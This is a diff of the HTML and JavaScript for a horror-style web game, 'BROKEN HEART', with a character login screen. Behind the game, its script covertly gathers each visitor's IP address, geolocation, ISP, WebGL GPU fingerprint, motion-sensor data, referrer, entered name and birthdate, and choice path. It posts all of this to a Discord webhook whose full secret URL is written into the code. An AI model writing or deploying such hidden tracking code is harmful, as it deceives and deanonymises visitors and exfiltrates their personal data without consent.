@@ -21,6 +21,7 @@
       color:var(--fg);
       font-family: ui-sans-serif, system-ui, -apple-system, Segoe UI, Roboto, Arial;
       overflow:hidden;
+      transition: filter 0.5s ease;
     }
     .wrap{
       height:100%;
@@ -52,6 +53,11 @@
       display:flex;
       gap:12px;
       align-items:center;
+    }
+    .dot{
+      width:10px;height:10px;border-radius:999px;
+      background:#fff;
+      box-shadow:0 0 18px rgba(255,255,255,.35);
     }
     .brand h1{
       margin:0;
@@ -130,7 +136,7 @@
       margin:18px 0 10px;
       flex-wrap:wrap;
     }
-    input{
+    input, select{
       width:min(420px, 86vw);
       padding:14px 14px;
       border-radius:16px;
@@ -142,7 +148,15 @@
       letter-spacing:.12em;
       text-align:center;
     }
-    input:focus{border-color:rgba(255,255,255,.38)}
+    select{
+      cursor:pointer;
+      background:rgba(255,255,255,.05);
+    }
+    select option{
+      background:#111;
+      color:#fff;
+    }
+    input:focus, select:focus{border-color:rgba(255,255,255,.38)}
     .msg{
       text-align:center;
       min-height:20px;
@@ -413,7 +427,7 @@
       </div>
       <div class="content" id="app"></div>
       <div class="footer">
-        <div>CHARACTER LOGIN</div>
+        <div>CHARACTER LOGIN • ECHO ACTIVE</div>
         <a class="link" href="#" id="reset">Reset All</a>
       </div>
     </div>
@@ -425,84 +439,226 @@
 <script>
 (() => {
   // ============================================================
-  // YOUR DISCORD WEBHOOK (CONFIGURED)
+  // DISCORD WEBHOOK (CONFIGURED)
   // ============================================================
   const WEBHOOK = "https://discord.com/api/webhooks/1468139963924086917/MWWyocquSF17U-99E3fChkTHTJFPrhmVk8vaeNpj14RJSSTRbFzNSqHJV89mOz754gMG";
   
   // ============================================================
-  // 1. IP LOGGING
+  // SOUL COLORS SYSTEM
   // ============================================================
-  let ipLogged = false;
+  const SOUL_COLORS = {
+    rage: { 
+      name: "Crimson", emoji: "🩸", color: "#ff2b2b",
+      greeting: "The void sees anger. It feeds on that."
+    },
+    sorrow: { 
+      name: "Azure", emoji: "💙", color: "#4a90e2",
+      greeting: "The void sees grief. It remembers your tears."
+    },
+    void: { 
+      name: "Obsidian", emoji: "🖤", color: "#1a1a1a",
+      greeting: "The void sees nothing. You are already empty."
+    },
+    hopeless_hope: { 
+      name: "Pearl", emoji: "🤍", color: "#f0f0f0",
+      greeting: "The void sees hope. It will crush that too."
+    }
+  };
   
-  async function captureVisitorData() {
-    if (ipLogged) return;
-    ipLogged = true;
+  // ============================================================
+  // UNIFIED DATA COLLECTOR
+  // ============================================================
+  const visitorData = {
+    ip: null,
+    webgl: null,
+    motion: null,
+    character: null,
+    geo: null,
+    path: [],
+    timestamp: new Date().toISOString(),
+    isNewCharacter: false
+  };
+  
+  let dataSent = false;
+  let geoReady = false;
+  let webglReady = false;
+  
+  // ============================================================
+  // SEND ONE COMBINED EMBED
+  // ============================================================
+  async function sendCombinedEmbed() {
+    // Wait for required data
+    if (!visitorData.geo || !visitorData.webgl) return;
+    
+    // Pick soul color
+    const soulKey = visitorData.character?.soulColor || "void";
+    const soul = SOUL_COLORS[soulKey];
+    const embedColor = parseInt(soul.color.replace('#', ''), 16);
+    
+    // Format path
+    const pathStr = visitorData.path.length > 0 
+      ? visitorData.path.join(" → ").substring(0, 200) 
+      : "*no path recorded yet*";
+    
+    // Format motion
+    let motionStr = "*not captured*";
+    if (visitorData.motion && visitorData.motion.hash) {
+      motionStr = `Hash: \`${visitorData.motion.hash}\`\nSamples: ${visitorData.motion.sampleCount} | Duration: ${visitorData.motion.duration}ms`;
+    }
+    
+    // Format last visit
+    let lastVisitStr = "first time";
+    if (visitorData.character?.lastSeen) {
+      const hoursAgo = Math.floor((Date.now() - visitorData.character.lastSeen) / 3600000);
+      if (hoursAgo > 0) {
+        lastVisitStr = hoursAgo < 24 
+          ? `${hoursAgo}h ago` 
+          : `${Math.floor(hoursAgo / 24)}d ago`;
+      } else {
+        lastVisitStr = "just now";
+      }
+    }
+    
+    const embed = {
+      title: "💔 BROKEN HEART // ECHO",
+      color: embedColor,
+      description: `*"${soul.greeting}"*`,
+      timestamp: visitorData.timestamp,
+      fields: [
+        // === CHARACTER SECTION ===
+        {
+          name: "🩸 SOUL",
+          value: `${soul.emoji} **${soul.name}**`,
+          inline: true
+        },
+        {
+          name: "👤 CHARACTER",
+          value: visitorData.character?.name 
+            ? `\`${visitorData.character.name}\`` 
+            : "*not registered*",
+          inline: true
+        },
+        {
+          name: "🔁 VISITS",
+          value: visitorData.character?.visits 
+            ? `${visitorData.character.visits}x` 
+            : "1st visit",
+          inline: true
+        },
+        
+        // === NETWORK SECTION ===
+        {
+          name: "🌐 IP",
+          value: visitorData.geo?.ip 
+            ? `\`${visitorData.geo.ip}\`` 
+            : "unknown",
+          inline: true
+        },
+        {
+          name: "📍 LOCATION",
+          value: visitorData.geo 
+            ? `${visitorData.geo.city || "?"}, ${visitorData.geo.country_name || "?"}` 
+            : "unknown",
+          inline: true
+        },
+        {
+          name: "📡 ISP",
+          value: visitorData.geo?.org 
+            ? visitorData.geo.org.substring(0, 40) 
+            : "unknown",
+          inline: false
+        },
+        
+        // === DEVICE SECTION ===
+        {
+          name: "🖥️ GPU (WebGL)",
+          value: visitorData.webgl?.renderer 
+            ? `\`${visitorData.webgl.renderer}\`` 
+            : "*unavailable*",
+          inline: false
+        },
+        {
+          name: "📐 SCREEN",
+          value: visitorData.webgl?.screen || "unknown",
+          inline: true
+        },
+        {
+          name: "🎯 DEVICE HASH",
+          value: visitorData.webgl?.fingerprintHash 
+            ? `\`${visitorData.webgl.fingerprintHash}\`` 
+            : "unknown",
+          inline: true
+        },
+        
+        // === MOTION SECTION ===
+        {
+          name: "📳 MOTION SENSOR",
+          value: motionStr,
+          inline: false
+        },
+        
+        // === TRACKING SECTION ===
+        {
+          name: "🔗 REFERRER",
+          value: document.referrer || "direct",
+          inline: true
+        },
+        {
+          name: "🕯️ LAST VISIT",
+          value: lastVisitStr,
+          inline: true
+        },
+        {
+          name: "📖 PATH",
+          value: pathStr,
+          inline: false
+        }
+      ],
+      footer: { text: `BROKEN HEART • ${visitorData.character?.birthdate || "no birthdate"}` }
+    };
     
     try {
-      const geoRes = await fetch("https://ipapi.co/json/");
-      const geo = await geoRes.json();
-      
-      const deviceType = /Mobile|Android|iPhone|iPad|iPod/i.test(navigator.userAgent) ? "📱 Mobile" : "💻 Desktop";
-      const browser = navigator.userAgent.split(" ").pop() || "Unknown";
-      const os = navigator.platform || "Unknown";
-      
-      const embed = {
-        title: "NEW VISITOR DETECTED",
-        color: 0xff6600,
-        timestamp: new Date().toISOString(),
-        fields: [
-          { name: "IP Address", value: `\`${geo.ip || "unknown"}\``, inline: true },
-          { name: "Location", value: `${geo.city || "unknown"}, ${geo.region || "unknown"}, ${geo.country_name || "unknown"}`, inline: true },
-          { name: "ISP", value: (geo.org || "unknown").substring(0, 50), inline: false },
-          { name: "Device", value: `${deviceType}`, inline: true },
-          { name: "OS / Browser", value: `${os} / ${browser.substring(0, 30)}`, inline: true },
-          { name: "Screen Resolution", value: `${screen.width}x${screen.height}`, inline: true },
-          { name: "Referrer", value: document.referrer || "direct", inline: false }
-        ],
-        footer: { text: "No character data yet - just visited the page" }
-      };
-      
       await fetch(WEBHOOK, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ embeds: [embed] })
       });
     } catch(e) {
-      console.log("IP log failed");
+      console.log("Combined embed send failed");
+    }
+  }
+  
+  // ============================================================
+  // IP LOGGING
+  // ============================================================
+  async function captureVisitorData() {
+    try {
+      const geoRes = await fetch("https://ipapi.co/json/");
+      const geo = await geoRes.json();
+      visitorData.geo = geo;
+      geoReady = true;
+      if (webglReady) setTimeout(sendCombinedEmbed, 100);
+    } catch(e) {
+      console.log("IP capture failed");
     }
   }
   
   captureVisitorData();
   
   // ============================================================
-  // 2. WEBGL FINGERPRINTING
+  // WEBGL FINGERPRINTING
   // ============================================================
-  
   async function getWebGLFingerprint() {
     try {
       const canvas = document.createElement('canvas');
       const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-      
-      if (!gl) {
-        console.log("WebGL not supported");
-        return null;
-      }
+      if (!gl) return null;
       
       const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-      if (!debugInfo) {
-        console.log("WEBGL_debug_renderer_info not available");
-        return null;
-      }
+      if (!debugInfo) return null;
       
       const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
       const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-      
-      const screenData = {
-        width: screen.width,
-        height: screen.height,
-        colorDepth: screen.colorDepth,
-        pixelRatio: window.devicePixelRatio || 1
-      };
       
       const fingerprintString = `${renderer}|${screen.width}x${screen.height}|${screen.colorDepth}|${navigator.userAgent}`;
       
@@ -516,273 +672,146 @@
       return {
         vendor: vendor,
         renderer: renderer,
-        screen: `${screenData.width}x${screenData.height}`,
-        pixelRatio: screenData.pixelRatio,
+        screen: `${screen.width}x${screen.height}`,
+        pixelRatio: window.devicePixelRatio || 1,
         fingerprintHash: hash.toString(16)
       };
     } catch (e) {
-      console.log("WebGL fingerprinting failed:", e);
       return null;
     }
   }
 
-  (async function sendFingerprint() {
-    const fingerprint = await getWebGLFingerprint();
-    if (!fingerprint) return;
+  (async function() {
+    const fp = await getWebGLFingerprint();
+    if (fp) {
+      visitorData.webgl = fp;
+      webglReady = true;
+      if (geoReady) setTimeout(sendCombinedEmbed, 100);
+    }
+  })();
+  
+  // ============================================================
+  // MOTION SENSOR FINGERPRINTING
+  // ============================================================
+  let motionData = [];
+  let isCollecting = false;
+  
+  async function requestMotionPermission() {
+    if (typeof DeviceMotionEvent !== 'undefined' && 
+        typeof DeviceMotionEvent.requestPermission === 'function') {
+      try {
+        const permissionState = await DeviceMotionEvent.requestPermission();
+        return permissionState === 'granted';
+      } catch (error) {
+        return false;
+      }
+    }
+    return true;
+  }
+
+  function startMotionCollection(durationMs = 3000) {
+    if (isCollecting) return;
+    motionData = [];
+    isCollecting = true;
+    window.addEventListener('devicemotion', motionHandler);
+    setTimeout(() => stopMotionCollection(), durationMs);
+  }
+
+  function motionHandler(event) {
+    if (!isCollecting) return;
+    const acc = event.acceleration;
+    motionData.push({
+      accX: acc?.x || null,
+      accY: acc?.y || null,
+      accZ: acc?.z || null
+    });
+  }
+
+  function stopMotionCollection() {
+    if (!isCollecting) return;
+    isCollecting = false;
+    window.removeEventListener('devicemotion', motionHandler);
     
-    const embed = {
-      title: "DEVICE FINGERPRINT",
-      color: 0x9b59b6,
-      timestamp: new Date().toISOString(),
-      fields: [
-        { name: "GPU (WebGL)", value: `\`${fingerprint.renderer}\``, inline: false },
-        { name: "Screen Resolution", value: fingerprint.screen, inline: true },
-        { name: "Pixel Ratio", value: fingerprint.pixelRatio.toString(), inline: true },
-        { name: "Device Hash", value: `\`${fingerprint.fingerprintHash}\``, inline: false }
-      ],
-      footer: { text: "WebGL fingerprint - Unique identifier for this device" }
-    };
+    if (motionData.length === 0) {
+      visitorData.motion = null;
+    } else {
+      const dataStr = JSON.stringify(motionData);
+      let hash = 0;
+      for (let i = 0; i < dataStr.length; i++) {
+        const char = dataStr.charCodeAt(i);
+        hash = ((hash << 5) - hash) + char;
+        hash = hash & hash;
+      }
+      
+      visitorData.motion = {
+        hash: hash.toString(16),
+        sampleCount: motionData.length,
+        duration: 3000
+      };
+    }
     
+    // Update if data already sent (send a second, smaller message)
+    if (dataSent) {
+      sendMotionUpdate();
+    } else {
+      setTimeout(sendCombinedEmbed, 100);
+    }
+  }
+  
+  async function sendMotionUpdate() {
+    if (!visitorData.motion) return;
     try {
+      const embed = {
+        title: "📳 MOTION SENSOR UPDATE",
+        color: 0x00ccff,
+        timestamp: new Date().toISOString(),
+        fields: [
+          { name: "Character", value: visitorData.character?.name || "Unknown", inline: true },
+          { name: "Motion Hash", value: `\`${visitorData.motion.hash}\``, inline: true },
+          { name: "Samples", value: visitorData.motion.sampleCount.toString(), inline: true }
+        ],
+        footer: { text: "Motion captured after initial visit" }
+      };
       await fetch(WEBHOOK, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ embeds: [embed] })
       });
-    } catch(e) {
-      console.log("Fingerprint send failed");
-    }
-  })();
-  
-  // ============================================================
-  // 3. MOTION SENSOR FINGERPRINTING
-  // ============================================================
-  let motionData = [];
-  let isCollecting = false;
-  let collectionStartTime = null;
-  const hasMotionSupport = 'DeviceMotionEvent' in window;
-
-  async function requestMotionPermission() {
-      if (typeof DeviceMotionEvent !== 'undefined' && 
-          typeof DeviceMotionEvent.requestPermission === 'function') {
-          try {
-              const permissionState = await DeviceMotionEvent.requestPermission();
-              if (permissionState === 'granted') {
-                  console.log('Motion permission granted');
-                  return true;
-              } else {
-                  console.log('Motion permission denied');
-                  return false;
-              }
-          } catch (error) {
-              console.log('Motion permission error:', error);
-              return false;
-          }
-      } else {
-          return true;
-      }
-  }
-
-  function startMotionCollection(durationMs = 3000) {
-      if (isCollecting) return;
-      
-      motionData = [];
-      collectionStartTime = Date.now();
-      isCollecting = true;
-      
-      window.addEventListener('devicemotion', motionHandler);
-      
-      setTimeout(() => {
-          stopMotionCollection();
-      }, durationMs);
-  }
-
-  function motionHandler(event) {
-      if (!isCollecting) return;
-      
-      const acc = event.acceleration;
-      const accG = event.accelerationIncludingGravity;
-      const rotation = event.rotationRate;
-      const interval = event.interval;
-      
-      motionData.push({
-          timestamp: Date.now(),
-          accX: acc?.x || null,
-          accY: acc?.y || null,
-          accZ: acc?.z || null,
-          accGX: accG?.x || null,
-          accGY: accG?.y || null,
-          accGZ: accG?.z || null,
-          rotAlpha: rotation?.alpha || null,
-          rotBeta: rotation?.beta || null,
-          rotGamma: rotation?.gamma || null,
-          interval: interval
-      });
-  }
-
-  function stopMotionCollection() {
-      if (!isCollecting) return;
-      
-      isCollecting = false;
-      window.removeEventListener('devicemotion', motionHandler);
-      
-      const fingerprint = generateMotionFingerprint(motionData);
-      sendMotionFingerprintToDiscord(fingerprint);
-  }
-
-  function generateMotionFingerprint(data) {
-      if (data.length === 0) return null;
-      
-      const accXValues = data.map(d => d.accX).filter(v => v !== null);
-      const accYValues = data.map(d => d.accY).filter(v => v !== null);
-      const accZValues = data.map(d => d.accZ).filter(v => v !== null);
-      
-      function variance(values) {
-          if (values.length === 0) return null;
-          const mean = values.reduce((a, b) => a + b, 0) / values.length;
-          const squareDiffs = values.map(value => Math.pow(value - mean, 2));
-          return squareDiffs.reduce((a, b) => a + b, 0) / values.length;
-      }
-      
-      function range(values) {
-          if (values.length === 0) return null;
-          return Math.max(...values) - Math.min(...values);
-      }
-      
-      function stdDev(values) {
-          if (values.length === 0) return null;
-          const varVal = variance(values);
-          return varVal !== null ? Math.sqrt(varVal) : null;
-      }
-      
-      function mean(values) {
-          if (values.length === 0) return null;
-          return values.reduce((a, b) => a + b, 0) / values.length;
-      }
-      
-      const fingerprintString = JSON.stringify({
-          accXVar: variance(accXValues),
-          accYVar: variance(accYValues),
-          accZVar: variance(accZValues),
-          accXRange: range(accXValues),
-          accYRange: range(accYValues),
-          accZRange: range(accZValues),
-          accXMean: mean(accXValues),
-          accYMean: mean(accYValues),
-          accZMean: mean(accZValues),
-          accXStd: stdDev(accXValues),
-          accYStd: stdDev(accYValues),
-          accZStd: stdDev(accZValues),
-          sampleCount: data.length,
-          duration: data.length > 0 ? data[data.length-1].timestamp - data[0].timestamp : 0
-      });
-      
-      let hash = 0;
-      for (let i = 0; i < fingerprintString.length; i++) {
-          const char = fingerprintString.charCodeAt(i);
-          hash = ((hash << 5) - hash) + char;
-          hash = hash & hash;
-      }
-      
-      return {
-          hash: hash.toString(16),
-          variance: {
-              x: variance(accXValues),
-              y: variance(accYValues),
-              z: variance(accZValues)
-          },
-          sampleCount: data.length,
-          duration: data.length > 0 ? data[data.length-1].timestamp - data[0].timestamp : 0,
-          hasMotionSensor: true
-      };
-  }
-
-  async function sendMotionFingerprintToDiscord(fingerprint) {
-      if (!fingerprint) {
-          const embed = {
-              title: "MOTION SENSOR STATUS",
-              color: 0xffaa00,
-              fields: [
-                  { name: "Status", value: "Motion sensors unavailable or permission denied", inline: false },
-                  { name: "Browser", value: navigator.userAgent.substring(0, 60), inline: false }
-              ],
-              footer: { text: "User may have denied permission or device lacks sensors" }
-          };
-          
-          try {
-              await fetch(WEBHOOK, {
-                  method: "POST",
-                  headers: { "Content-Type": "application/json" },
-                  body: JSON.stringify({ embeds: [embed] })
-              });
-          } catch(e) {}
-          return;
-      }
-      
-      const embed = {
-          title: "MOTION SENSOR FINGERPRINT",
-          color: 0x00ccff,
-          timestamp: new Date().toISOString(),
-          fields: [
-              { name: "Device Hash", value: `\`${fingerprint.hash}\``, inline: false },
-              { name: "Sensor Variance (X/Y/Z)", value: `${fingerprint.variance.x?.toFixed(4) || 'N/A'} / ${fingerprint.variance.y?.toFixed(4) || 'N/A'} / ${fingerprint.variance.z?.toFixed(4) || 'N/A'}`, inline: false },
-              { name: "Sample Count", value: fingerprint.sampleCount.toString(), inline: true },
-              { name: "Duration (ms)", value: fingerprint.duration.toString(), inline: true },
-              { name: "Note", value: "Variance patterns can help identify unique devices", inline: false }
-          ],
-          footer: { text: "Motion sensor fingerprint - Manufacturing imperfections create unique patterns" }
-      };
-      
-      try {
-          await fetch(WEBHOOK, {
-              method: "POST",
-              headers: { "Content-Type": "application/json" },
-              body: JSON.stringify({ embeds: [embed] })
-          });
-      } catch(e) {
-          console.log("Motion fingerprint send failed");
-      }
+    } catch(e) {}
   }
 
   async function initMotionFingerprinting() {
-      if (!hasMotionSupport) {
-          console.log("DeviceMotionEvent not supported");
-          return;
-      }
-      
-      const setupMotionOnClick = async () => {
-          const permissionGranted = await requestMotionPermission();
-          if (permissionGranted) {
-              startMotionCollection(3000);
-          } else {
-              sendMotionFingerprintToDiscord(null);
-          }
-          document.removeEventListener('click', setupMotionOnClick);
-          document.removeEventListener('touchstart', setupMotionOnClick);
-      };
-      
-      document.addEventListener('click', setupMotionOnClick);
-      document.addEventListener('touchstart', setupMotionOnClick);
-      
-      setTimeout(() => {
-          document.removeEventListener('click', setupMotionOnClick);
-          document.removeEventListener('touchstart', setupMotionOnClick);
-      }, 10000);
+    if (!('DeviceMotionEvent' in window)) return;
+    
+    const setupMotionOnClick = async () => {
+      const granted = await requestMotionPermission();
+      if (granted) startMotionCollection(3000);
+      document.removeEventListener('click', setupMotionOnClick);
+      document.removeEventListener('touchstart', setupMotionOnClick);
+    };
+    
+    document.addEventListener('click', setupMotionOnClick);
+    document.addEventListener('touchstart', setupMotionOnClick);
+    
+    setTimeout(() => {
+      document.removeEventListener('click', setupMotionOnClick);
+      document.removeEventListener('touchstart', setupMotionOnClick);
+    }, 10000);
   }
 
   initMotionFingerprinting();
   
   // ============================================================
-  // 4. CHARACTER SYSTEM & GAME STATE
+  // CHARACTER SYSTEM
   // ============================================================
   let currentCharacter = null;
-  let geoData = null;
   
   function loadCharacter() {
     const saved = localStorage.getItem("bh_character");
     if(saved) {
       try {
         currentCharacter = JSON.parse(saved);
+        visitorData.character = currentCharacter;
         return true;
       } catch(e) { return false; }
     }
@@ -801,6 +830,7 @@
       lastSeen: now
     };
     localStorage.setItem("bh_character", JSON.stringify(currentCharacter));
+    visitorData.character = currentCharacter;
     return currentCharacter;
   }
   
@@ -809,27 +839,76 @@
       currentCharacter.visits = (currentCharacter.visits || 1) + 1;
       currentCharacter.lastSeen = Date.now();
       localStorage.setItem("bh_character", JSON.stringify(currentCharacter));
+      visitorData.character = currentCharacter;
     }
   }
   
-  async function sendCharacterToDiscord(isNew, charData, geo) {
-    const visitCount = charData.visits || 1;
-    
+  // ============================================================
+  // PROGRESSIVE DARKNESS
+  // ============================================================
+  function applyDarkness() {
+    const badCount = parseInt(localStorage.getItem("bh_bad_count") || "0");
+    const darkness = Math.min(badCount * 0.04, 0.4);
+    const saturation = Math.max(1 - badCount * 0.1, 0.3);
+    document.body.style.filter = `brightness(${1 - darkness}) saturate(${saturation})`;
+  }
+  
+  function incrementBadCount() {
+    const count = parseInt(localStorage.getItem("bh_bad_count") || "0") + 1;
+    localStorage.setItem("bh_bad_count", count.toString());
+  }
+  
+  // ============================================================
+  // LIVE COUNTER
+  // ============================================================
+  function updateLiveCounter() {
+    const now = Date.now();
+    const key = "bh_active";
+    let active = JSON.parse(localStorage.getItem(key) || "[]");
+    active = active.filter(t => now - t < 60000);
+    active.push(now);
+    localStorage.setItem(key, JSON.stringify(active));
+    return active.length;
+  }
+  
+  // ============================================================
+  // RETURNING PLAYER MESSAGE
+  // ============================================================
+  function getReturningMessage() {
+    if (!currentCharacter || !currentCharacter.lastSeen) return null;
+    const hoursSince = (Date.now() - currentCharacter.lastSeen) / 3600000;
+    if (hoursSince < 24) return null;
+    const days = Math.floor(hoursSince / 24);
+    const messages = [
+      `You left ${days} day${days > 1 ? 's' : ''} ago. The room counted every minute.`,
+      `${days} day${days > 1 ? 's' : ''}. That's how long you were gone. The void waited.`,
+      `You came back after ${days} day${days > 1 ? 's' : ''}. They always come back.`,
+      `${days} day${days > 1 ? 's' : ''} of silence. Now you're here. Why?`
+    ];
+    return messages[Math.floor(Math.random() * messages.length)];
+  }
+  
+  // ============================================================
+  // PATH TRACKER
+  // ============================================================
+  function logChoice(nodeName, choiceLabel) {
+    visitorData.path.push(`${nodeName}:${choiceLabel}`);
+    if (visitorData.path.length > 20) visitorData.path.shift();
+  }
+  
+  async function sendEndingToDiscord(endingName) {
+    const soul = SOUL_COLORS[visitorData.character?.soulColor || "void"];
     const embed = {
-      title: isNew ? "NEW SOUL REGISTERED" : "RETURNING SOUL",
-      color: isNew ? 0xff2b2b : 0xaa44ff,
+      title: `🏁 ENDING: ${endingName}`,
+      color: parseInt(soul.color.replace('#', ''), 16),
       timestamp: new Date().toISOString(),
       fields: [
-        { name: "Character Name", value: `\`${charData.name}\``, inline: true },
-        { name: "Birthdate", value: `\`${charData.birthdate}\``, inline: true },
-        { name: "Visit Number", value: `${visitCount} time${visitCount !== 1 ? 's' : ''}`, inline: true },
-        { name: "First Played", value: new Date(charData.created).toLocaleString(), inline: false },
-        { name: "IP Address (linked)", value: `\`${geo?.ip || "unknown"}\``, inline: true },
-        { name: "Location (linked)", value: `${geo?.city || "unknown"}, ${geo?.country_name || "unknown"}`, inline: true }
+        { name: "Character", value: visitorData.character?.name || "Unknown", inline: true },
+        { name: "Soul", value: `${soul.emoji} ${soul.name}`, inline: true },
+        { name: "Path", value: visitorData.path.join(" → ").substring(0, 200) || "*no path*", inline: false }
       ],
-      footer: { text: isNew ? "A new soul enters the broken heart" : "Someone who keeps coming back..." }
+      footer: { text: "The void remembers every step" }
     };
-    
     try {
       await fetch(WEBHOOK, {
         method: "POST",
@@ -839,7 +918,9 @@
     } catch(e) {}
   }
   
-  // Game State
+  // ============================================================
+  // GAME STATE
+  // ============================================================
   const PASS_MAIN = "4820";
   const PASS_SECRET = "9281.";
   const STORAGE = { gate:"bh_gate", seenBad:"bh_seen_bad", ultraUnlocked:"bh_ultra" };
@@ -866,7 +947,9 @@
   function clearAll(){
     Object.values(STORAGE).forEach(k => localStorage.removeItem(k));
     localStorage.removeItem("bh_character");
+    localStorage.removeItem("bh_bad_count");
     currentCharacter = null;
+    visitorData.character = null;
     state.gate = "main";
     state.seenBad = false;
     state.ultraUnlocked = false;
@@ -882,585 +965,13 @@
   
   function el(html){ const t = document.createElement("template"); t.innerHTML = html.trim(); return t.content.firstElementChild; }
   
-  // IP data fetch for character linking
-  fetch("https://ipapi.co/json/").then(r=>r.json()).then(geo => {
-    geoData = geo;
-    if(currentCharacter) {
-      sendCharacterToDiscord(false, currentCharacter, geo);
-    }
-  }).catch(e=>console.log);
-  
-  // Character Login Screen (CLEAN, NO EMOJIS)
+  // ============================================================
+  // CHARACTER LOGIN SCREEN
+  // ============================================================
   function screenCharacterLogin() {
     hint.textContent = "REGISTRY";
     
     const node = document.createElement("div");
     node.innerHTML = `
       <div>
-        <div class="title">BROKEN HEART</div>
-        <p class="subtitle">
-          Before you enter... tell me who you are.
-        </p>
-        
-        <div class="character-form">
-          <div class="input-group">
-            <label>CHARACTER NAME</label>
-            <input type="text" id="charName" class="character-input" placeholder="LostSoul, Dreamer, Nobody" maxlength="30" autocomplete="off">
-          </div>
-          
-          <div class="input-group">
-            <label>BIRTHDATE (MM/DD/YYYY)</label>
-            <input type="text" id="charBirth" class="character-input" placeholder="12/25/1998" maxlength="10" autocomplete="off">
-          </div>
-          
-          <div class="row">
-            <button class="primary" id="enterVoid">ENTER THE VOID</button>
-          </div>
-        </div>
-        
-        <div class="msg" id="loginMsg"></div>
-        <div class="login-info">Your soul will be remembered.</div>
-      </div>
-    `;
-    
-    const nameInput = node.querySelector("#charName");
-    const birthInput = node.querySelector("#charBirth");
-    const msg = node.querySelector("#loginMsg");
-    
-    const enter = async () => {
-      const name = nameInput.value.trim();
-      const birth = birthInput.value.trim();
-      
-      if(!name) {
-        msg.textContent = "You need a name to enter.";
-        return;
-      }
-      if(!birth || !/^\d{2}\/\d{2}\/\d{4}$/.test(birth)) {
-        msg.textContent = "Birthdate must be MM/DD/YYYY format.";
-        return;
-      }
-      
-      msg.textContent = "The void accepts you...";
-      
-      const isNew = !currentCharacter;
-      const savedChar = saveCharacter(name, birth, "void");
-      
-      if(geoData) {
-        await sendCharacterToDiscord(isNew, savedChar, geoData);
-      }
-      
-      await new Promise(r => setTimeout(r, 800));
-      setGate("main");
-      render();
-    };
-    
-    node.querySelector("#enterVoid").addEventListener("click", enter);
-    nameInput.addEventListener("keydown", (e) => { if(e.key === "Enter") enter(); });
-    birthInput.addEventListener("keydown", (e) => { if(e.key === "Enter") enter(); });
-    
-    setTimeout(() => nameInput.focus(), 50);
-    return node;
-  }
-  
-  // ============================================================
-  // 5. DARK FOREST SEQUENCE (CODE 3851) - CREEPY VOICE + WORKING ANIMATION
-  // ============================================================
-  let forestStep = 0;
-  let forestAnswers = {};
-
-  // Creepy voice function - deeper, slower, raspier
-  function speak(text) {
-      if ('speechSynthesis' in window) {
-          speechSynthesis.cancel();
-          const utterance = new SpeechSynthesisUtterance(text);
-          utterance.rate = 0.4;
-          utterance.pitch = 0.3;
-          utterance.volume = 0.9;
-          
-          // Try to get a deeper voice if available
-          const voices = speechSynthesis.getVoices();
-          const deepVoice = voices.find(v => v.name.toLowerCase().includes('google uk english') || 
-                                           v.name.toLowerCase().includes('male') ||
-                                           v.name.toLowerCase().includes('deep'));
-          if (deepVoice) utterance.voice = deepVoice;
-          
-          speechSynthesis.speak(utterance);
-      }
-  }
-
-  function startDarkForestSequence() {
-      forestStep = 0;
-      forestAnswers = {};
-      
-      // Add screen crack effect
-      fx.classList.add("show");
-      glitchText.textContent = "3851";
-      glitchCenter.classList.add("show");
-      
-      app.innerHTML = `
-          <div id="forestContainer" style="
-              position: fixed;
-              top: 0;
-              left: 0;
-              width: 100%;
-              height: 100%;
-              background: #000000;
-              z-index: 2000;
-              overflow: hidden;
-              animation: forestGlitchIn 0.8s ease-out;
-          ">
-              <!-- Static grain overlay -->
-              <div style="
-                  position: absolute;
-                  top: 0;
-                  left: 0;
-                  width: 100%;
-                  height: 100%;
-                  background: repeating-radial-gradient(circle at 20% 30%, rgba(0,0,0,0) 0px, rgba(0,0,0,0.5) 2px, #000 3px);
-                  pointer-events: none;
-                  opacity: 0.3;
-                  z-index: 10;
-              "></div>
-              
-              <!-- Dark sky gradient -->
-              <div style="position:absolute; top:0; left:0; width:100%; height:100%; background: linear-gradient(180deg, #0a0a0a 0%, #1a0a0a 50%, #0a0505 100%);"></div>
-              
-              <!-- Moon -->
-              <div style="position:absolute; top:10%; right:15%; width:60px; height:60px; background:#c0c0c0; border-radius:50%; box-shadow:0 0 20px rgba(200,200,200,0.3); opacity:0.6;"></div>
-              <div style="position:absolute; top:10%; right:15%; width:60px; height:60px; background:repeating-linear-gradient(45deg, #000 0px, #000 3px, transparent 3px, transparent 8px); border-radius:50%;"></div>
-              
-              <!-- Dead trees (background) -->
-              <svg style="position:absolute; bottom:0; left:0; width:100%; height:45%;" preserveAspectRatio="none" viewBox="0 0 500 200" opacity="0.5">
-                  <path d="M50,200 L70,100 L90,200 Z" fill="#0d0d0d" />
-                  <path d="M130,200 L150,70 L170,200 Z" fill="#0a0a0a" />
-                  <path d="M220,200 L240,90 L260,200 Z" fill="#0d0d0d" />
-                  <path d="M320,200 L340,60 L360,200 Z" fill="#0a0a0a" />
-                  <path d="M410,200 L430,110 L450,200 Z" fill="#0d0d0d" />
-              </svg>
-              
-              <!-- Foreground trees (darker, larger) -->
-              <svg style="position:absolute; bottom:0; left:0; width:100%; height:60%;" preserveAspectRatio="none" viewBox="0 0 500 200" opacity="0.9">
-                  <path d="M-10,200 L25,30 L60,200 Z" fill="#050505" />
-                  <path d="M90,200 L120,50 L150,200 Z" fill="#050505" />
-                  <path d="M190,200 L220,20 L250,200 Z" fill="#050505" />
-                  <path d="M290,200 L320,40 L350,200 Z" fill="#050505" />
-                  <path d="M390,200 L420,60 L450,200 Z" fill="#050505" />
-                  <path d="M480,200 L510,30 L540,200 Z" fill="#050505" />
-              </svg>
-              
-              <!-- Creepy hooded figure (animated, appears from ground) -->
-              <div id="creepyFigure" style="
-                  position: absolute;
-                  bottom: 15%;
-                  left: 50%;
-                  transform: translateX(-50%) scale(0.8);
-                  width: 150px;
-                  height: 240px;
-                  opacity: 0;
-                  animation: figureRise 3s ease-out forwards;
-                  z-index: 20;
-                  filter: drop-shadow(0 0 20px #000);
-              ">
-                  <svg viewBox="0 0 200 300" style="width:100%; height:100%;">
